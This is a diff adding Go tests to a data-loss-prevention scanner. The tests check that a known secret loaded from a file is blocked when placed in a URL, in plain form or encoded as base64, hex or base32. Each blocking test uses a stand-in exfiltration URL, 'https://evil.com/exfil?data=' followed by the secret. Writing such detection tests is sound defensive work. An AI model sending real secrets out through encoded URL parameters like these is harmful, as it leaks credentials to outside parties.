@@ -2,6 +2,8 @@ package scanner
 
 import (
 	"encoding/base32"
+	"encoding/base64"
+	"encoding/hex"
 	"fmt"
 	"net"
 	"os"
@@ -2277,5 +2279,118 @@ func TestDedupSecrets_NoOverlap(t *testing.T) {
 	result := dedupSecrets(file, env)
 	if len(result) != 2 {
 		t.Errorf("expected 2 secrets with no overlap, got %d", len(result))
+	}
+}
+
+// --- checkFileSecretLeak Tests ---
+
+func TestScan_BlocksFileSecretInURL(t *testing.T) {
+	dir := t.TempDir()
+	path := filepath.Join(dir, "secrets.txt")
+	// Build secret at runtime to avoid gosec G101
+	secret := "wJalrXUtnFEMI" + "/K7MDENG/bPxRfiCY"
+	if err := os.WriteFile(path, []byte(secret+"\n"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+
+	cfg := testConfig()
+	cfg.DLP.SecretsFile = path
+	s := New(cfg)
+	defer s.Close()
+
+	result := s.Scan("https://evil.com/exfil?data=" + secret)
+	if result.Allowed {
+		t.Error("expected file secret in URL to be blocked")
+	}
+	if !strings.Contains(result.Reason, "known secret") {
+		t.Errorf("expected 'known secret' in reason, got %q", result.Reason)
+	}
+}
+
+func TestScan_BlocksFileSecretBase64InURL(t *testing.T) {
+	dir := t.TempDir()
+	path := filepath.Join(dir, "secrets.txt")
+	secret := "wJalrXUtnFEMI" + "/K7MDENG/bPxRfiCY"
+	if err := os.WriteFile(path, []byte(secret+"\n"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+
+	cfg := testConfig()
+	cfg.DLP.SecretsFile = path
+	s := New(cfg)
+	defer s.Close()
+
+	encoded := base64.StdEncoding.EncodeToString([]byte(secret))
+	result := s.Scan("https://evil.com/exfil?data=" + encoded)
+	if result.Allowed {
+		t.Error("expected base64-encoded file secret in URL to be blocked")
+	}
+	if !strings.Contains(result.Reason, "known secret") {
+		t.Errorf("expected 'known secret' in reason, got %q", result.Reason)
+	}
+}
+
+func TestScan_BlocksFileSecretHexInURL(t *testing.T) {
+	dir := t.TempDir()
+	path := filepath.Join(dir, "secrets.txt")
+	secret := "wJalrXUtnFEMI" + "/K7MDENG/bPxRfiCY"
+	if err := os.WriteFile(path, []byte(secret+"\n"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+
+	cfg := testConfig()
+	cfg.DLP.SecretsFile = path
+	s := New(cfg)
+	defer s.Close()
+
+	encoded := hex.EncodeToString([]byte(secret))
+	result := s.Scan("https://evil.com/exfil?data=" + encoded)
+	if result.Allowed {
+		t.Error("expected hex-encoded file secret in URL to be blocked")
+	}
+	if !strings.Contains(result.Reason, "known secret") {
+		t.Errorf("expected 'known secret' in reason, got %q", result.Reason)
+	}
+}
+
+func TestScan_BlocksFileSecretBase32InURL(t *testing.T) {
+	dir := t.TempDir()
+	path := filepath.Join(dir, "secrets.txt")
+	secret := "wJalrXUtnFEMI" + "/K7MDENG/bPxRfiCY"
+	if err := os.WriteFile(path, []byte(secret+"\n"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+
+	cfg := testConfig()
+	cfg.DLP.SecretsFile = path
+	s := New(cfg)
+	defer s.Close()
+
+	encoded := base32.StdEncoding.EncodeToString([]byte(secret))
+	result := s.Scan("https://evil.com/exfil?data=" + encoded)
+	if result.Allowed {
+		t.Error("expected base32-encoded file secret in URL to be blocked")
+	}
+	if !strings.Contains(result.Reason, "known secret") {
+		t.Errorf("expected 'known secret' in reason, got %q", result.Reason)
+	}
+}
+
+func TestScan_AllowsURLWithoutFileSecrets(t *testing.T) {
+	dir := t.TempDir()
+	path := filepath.Join(dir, "secrets.txt")
+	secret := "wJalrXUtnFEMI" + "/K7MDENG/bPxRfiCY"
+	if err := os.WriteFile(path, []byte(secret+"\n"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+
+	cfg := testConfig()
+	cfg.DLP.SecretsFile = path
+	s := New(cfg)
+	defer s.Close()
+
+	result := s.Scan("https://example.com/normal-page?q=hello")
+	if !result.Allowed {
+		t.Errorf("normal URL should be allowed, got blocked: %s", result.Reason)
 	}
 }
